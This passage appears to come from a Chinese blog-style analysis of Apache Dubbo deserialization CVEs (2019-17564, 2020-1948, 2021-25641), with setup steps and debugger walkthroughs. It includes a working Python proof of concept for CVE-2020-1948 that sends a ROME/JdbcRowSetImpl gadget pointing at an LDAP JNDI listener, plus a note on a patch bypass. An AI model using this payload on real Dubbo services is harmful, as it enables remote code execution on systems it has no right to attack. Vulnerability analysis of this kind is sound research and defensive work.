0x00 起因
原本不想炒冷饭的，有一天看到师傅们再说IDEA里面Debug获取的时候会默认调用ToString
方法，然后就去google了一下相关的后反序列化知识，因为提前跑路却沦落在家隔离没事可做
就多搜索了一点，感觉Dubbo的三个洞还是蛮有代表性的，就调试分析学习下。
漏洞列表：
CVE-2019-17564
CVE-2020-1948
CVE-2021-25641
0x01 Dubbo介绍
Apache Dubbo 是一款高性能Java RPC框架。漏洞存在于 Apache Dubbo默认使用的反序列
化工具 hessian 中，攻击者可能会通过发送恶意 RPC 请求来触发漏洞，这类 RPC 请求中通常
会带有无法识别的服务名或方法名，以及一些恶意的参数负载。当恶意参数被反序列化时，达
到代码执行的目的。
使用Dubbo的最常见方法是在Spring框架中运行
dubbo 支持多种序列化方式并且序列化是和协议相对应的。比如：dubbo 协议的 dubbo， 
hessian2，java，compactedjava，rmi 协议缺省为 java，以及 http 协议的 json 等。
dubbo 序列化：阿里尚未开发成熟的高效 java 序列化实现，阿里不建议在生产环境
使用它
hessian2 序列化：hessian 是一种跨语言的高效二进制序列化方式。但这里实际不
是原生的 hessian2 序列化，而是阿里修改过的 hessian lite，它是 dubbo RPC 默认启
用的序列化方式
json 序列化：目前有两种实现，一种是采用的阿里的 fastjson 库，另一种是采用 
dubbo 中自己实现的简单 json 库，但其实现都不是特别成熟，而且 json 这种文本序列
化性能一般不如上面两种二进制序列化。
java 序列化：主要是采用 JDK 自带的 Java 序列化实现，性能很不理想。
这四种主要序列化方式的性能从上到下依次递减。对于 dubbo RPC 这种追求高性能的远程调用
方式来说，实际上只有 1、2 两种高效序列化方式比较般配，而第 1 个 dubbo 序列化由于还
不成熟，所以实际只剩下 2 可用，所以 dubbo RPC 默认采用 hessian2 序列化。
但 hessian 是一个比较老的序列化实现了，而且它是跨语言的，所以不是单独针对 java 进行
优化的。而 dubbo RPC 实际上完全是一种 Java to Java 的远程调用，其实没有必要采用跨语
言的序列化方式（当然肯定也不排斥跨语言的序列化）。
0x02 Dubbo环境搭建
（这里就用的网上的师傅的了，当然你要是只想复现的话，P牛vulhub里面也有现成的环境）
ZooKeeper：
下载地址：https://zookeeper.apache.org/releases.html
配置：
conf目录下提供了配置的样例zoo_sample.cfg，要将zk运行起来，需要将其名称修改为
zoo.cfg。（记得提前创建下data和Log的文件夹）
1
tickTime=2000
2
initLimit=10
3
syncLimit=5
4
dataDir=C:\\Users\\xxx\\Desktop\\zookeeper‐3.4.14\\conf\\data
5
dataLogDir=C:\\Users\\xxx\\Desktop\\zookeeper‐3.4.14\\conf\\log
6
clientPort=2181
然后启动bin目录下的文件就ok了，下面是windows成功的图
Dubbo项目：
这里推荐使用奶思师傅的模板（奶思师傅的文章是真的清晰，师傅们可以看下） 
https://www.anquanke.com/post/id/263274
0x03 CVE-2019-17564 Apache dubbo HTTP协议反序列化漏洞分析
0x03-0 漏洞介绍
本次问题出现在dubbo开启http协议后，会将消费者提交的request请求，在无安全校验的
情况下直接交给了spring-web.jar进行处理，最终request.getInputStream()被反序列化,故存
在反序列化漏洞。
0x03-1 影响范围
2.7.0 <= Apache Dubbo <= 2.7.4
2.6.0 <= Apache Dubbo <= 2.6.7
Apache Dubbo = 2.5.x
0x03-2 漏洞知识点
1.基本的一些链子知识（这个漏洞用到的相对较少）
0x03-3 漏洞调试
这里的断点参考了很多Y4er师傅的调试，第一个断点断在了
dubbo-2.7.3.jar!\org\apache\dubbo\remoting\http\servlet\DispatcherServlet.class
了，这里
然后后面我们跟进这个handle方法里面瞅瞅看，因为我们当前是http方式的，所以会跳到
org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle方法
这里判断了是否是POST方法，不是就抛出500的响应码了，所以这个洞也只能用POST请求的
方式触发我们继续
处理对象是HttpInvokerServiceExporter类对象，它负责获取远程调用对象，并执行获取
结果返回给客户端。
跟进它的handleRequest方法，request对象被传入readRemoteInvocation方法中来获取
RemoteInvocation远程调用对象
然后我们跟进    writeRemoteInvocationResult 
readRemoteInvocation方法将request.getInputStream()(我们提交的序列化内容)传入 
createObjectInputStream方法，封装为一个ObjectInputStream。该对象又被传入
doReadRemoteInvocation方法中，进行最终的获取操作。
在doReadRemoteInvocation方法中，ObjectInputStream类对象ois直接被反序列化了。这
个过程中没有进行任何过滤，导致我们传入的恶意序列化对象可以被反序列化创建，漏洞触
发！
1
//org.springframework.remoting.rmi.org.springframework.remoting.rmi.RemoteInv
ocationSerializingExporter
2
protected RemoteInvocation doReadRemoteInvocation(ObjectInputStream ois) thro
ws IOException, ClassNotFoundException {
3
 // 1. 恶意对象在此被反序列化，漏洞触发
4
 Object obj = ois.readObject();
5
 if (!(obj instanceof RemoteInvocation)) {
6
 throw new RemoteException("Deserialized object needs to be assignable to typ
e [" + RemoteInvocation.class.getName() + "]: " +
ClassUtils.getDescriptiveType(obj));
7
 } else {
8
 return (RemoteInvocation)obj;
9
 }
10
}
0x03-4 漏洞利用方面（实战方面）
其实这个洞理论上非常的不是很好用，因为确实是太多的限制，就是P神之前说到的一些点
1.默认Dubbo的通信方式是Dubbo协议，而非HTTP
2.而且利用该漏洞需要知道目标Dubbo的RPC接口名，Zookeeper除非有未授权漏洞让你获取
信息
3.Dubbo的利用常出现的是内网，基本上不能用在打点上
总之这并不是一个很好用的漏洞，偶尔可能会有奇效。
0x04 CVE-2020-1948 Apache dubbo Hession协议反序列化漏洞分析
0x04-0 漏洞介绍
Dubbo 2.7.6或更低版本采用hessian2实现反序列化，其中存在反序列化远程代码执行漏
洞。攻击者可以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当
服务端存在可以被利用的第三方库时，恶意参数被反序列化后形成可被利用的攻击链，直接对
Dubbo服务端进行恶意代码执行。
0x04-1 影响范围
Apache Dubbo 2.7.0 ~ 2.7.6
Apache Dubbo 2.6.0 ~ 2.6.7
Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
在实际测试中2.7.8补丁绕过可以打，而2.7.9失败
0x04-2 漏洞知识点
1.Hessian利用链（https://www.anquanke.com/post/id/263274#h2-9）
0x04-3 漏洞调试
调试前最好关闭 Enable 'toString()' object view，否则漏洞会提前自动触发
这里我用的是网上最大众的ROME链进行调试的，顺便说一下网上为什么会有两种调试流程
的原因：
原作者的POC，使用的是任意不存在的service和method，导致Dubbo找不到注册的service
而抛出异常，在抛出异常的时候触发漏洞，其实Dubbo在对注册的service其实会有另一种调用
流程，也就是使用comsumer携带恶意参数去远程调用这个真实存在的方法导致了会出现两种调
用链的不一样
所以有两种触发方法
1. 在刚传入序列化值时依赖Rome的toString方法通过构造HashMap触发key的hashCode实
现反序列化
2. 反序列化执行完成后，利用RemotingException抛出异常输出时隐式调用了Rome的
toString方法导致RCE
攻击的python版poc
1
from dubbo.codec.hessian2 import Decoder,new_object
2
from dubbo.client import DubboClient
3
4
client = DubboClient('127.0.0.1', 20880)
5
6
JdbcRowSetImpl=new_object(
7
 'com.sun.rowset.JdbcRowSetImpl',
8
 dataSource="ldap://127.0.0.1:1389/gvrrfk",
9
 strMatchColumns=["foo"]
10
 )
11
JdbcRowSetImplClass=new_object(
12
 'java.lang.Class',
13
 name="com.sun.rowset.JdbcRowSetImpl",
14
 )
15
toStringBean=new_object(
16
 'com.rometools.rome.feed.impl.ToStringBean',
17
 beanClass=JdbcRowSetImplClass,
18
 obj=JdbcRowSetImpl
19
 )
20
21
resp = client.send_request_and_return_response(
22
 service_name='cn.rui0',//这个是两种触发方法的不同之处
23
 method_name='$invoke',//这里也直接把绕过补丁的地方改好了
24
 args=[toStringBean])
25
26
print(resp)
27
情况一：
好，启动JNDI监听，我们将paylaod打过去之后，开始调试，入口点我们将第一个断点打在
dubbo-2.7.3.jar!\org\apache\dubbo\rpc\protocol\dubbo\DubboCountCodec.class#decode方
法（我看网上有师傅能断在received方法上，但是我找不到图了，啧啧啧），其实这里只是又
获取了一遍，并没有什么实质性的解码
继续跟进到
dubbo-
2.7.3.jar!\org\apache\dubbo\remoting\exchange\codec\ExchangeCodec.class#decode同名
函数之中（其实就是读取传输过来的数据进行数据获取然后调用了同名函数，主要还是一些处
理的方法），继续跟进到达DemoCodeC函数的decodebody方法内部（主要是104行触发了
deserialize方法）
跟进方法后，发现他是用一个HashMap来处理获取，然后通过获取参数获得到反序列化的协
议名称（这里久直接找的网上师傅的图了，有着具体id对应的序列化方式，下个漏洞的时候也
会再次提到），从而继续调用
然后根据获取到的id确定了具体的序列化方法
然后跟进到里面的的处理方法，流程还是比较长的，毕竟有一堆case，所以找比较重点的
（个人觉得吧）dubbo-
2.7.3.jar!\com\alibaba\com\caucho\hessian\io\JavaDeserializer.class#readobject方法
(不要郁闷为啥你跳进来和我不一样，因为有很多同名函数，这里就就截了一张图)
下一个比较重要的点是获取到ToStringBean的这里（这里相当于是不断读取payload里面传
入的类），因为触发原理实际上就是ROME链的ToStringBean.tostring()方法
然后继续跟进后会发现跟进一个Dubbo里面Hession协议对Map的处理（每个协议都有对应的
Map处理函数，这个后面也会愈发的体现出来），这里是根据Map类型进行操作（前面也说到了
他是构建了一个HashMap进行的操作）
这里也偷一下师傅的源码图
然后到达dubbo-
2.7.3.jar!\com\alibaba\com\caucho\hessian\io\MapDeserializer.class#doReadMap对于Map
进行读取的方法，继续跟进
继续跟进发现最终调用了key.hashCode方法，key为EqualsBean对象之后，顺利到达sink点
基本比较关键的调用链是
1
connect():624, JdbcRowSetImpl (com.sun.rowset)
2
getDatabaseMetaData():4004, JdbcRowSetImpl (com.sun.rowset)
3
invoke0(Method, Object, Object[]):‐1, NativeMethodAccessorImpl (sun.reflect)
4
invoke(Object, Object[]):62, NativeMethodAccessorImpl (sun.reflect)
5
invoke(Object, Object[]):43, DelegatingMethodAccessorImpl (sun.reflect)
6
invoke(Object, Object[]):498, Method (java.lang.reflect)
7
toString(String):158, ToStringBean (com.rometools.rome.feed.impl)
8
toString():129, ToStringBean (com.rometools.rome.feed.impl)
9
beanHashCode():198, EqualsBean (com.rometools.rome.feed.impl)
10
hashCode():180, EqualsBean (com.rometools.rome.feed.impl)
11
hash(Object):338, HashMap (java.util)
12
put(Object, Object):611, HashMap (java.util)
13
//接下来进入HashMap的反序列化过程：由于需要获取hash值，先要将对象转换为String，从
而循环调用对象中属性的toString()函数，最终调用了JdbcRowSetImpl的toString()
14
15
16
17
//利用了hessian的反序列化过程，接下来进入HashMap的反序列化过程。
18
doReadMap(AbstractHessianInput, Map, Class, Class):145, MapDeserializer
(com.alibaba.com.caucho.hessian.io)
19
readMap(AbstractHessianInput, Class, Class):126, MapDeserializer (com.alibab
a.com.caucho.hessian.io)
20
readObject(List):2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
21
readObject():2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
22
readObject(Class, Class[]):2080, Hessian2Input (com.alibaba.com.caucho.hessi
an.io)
23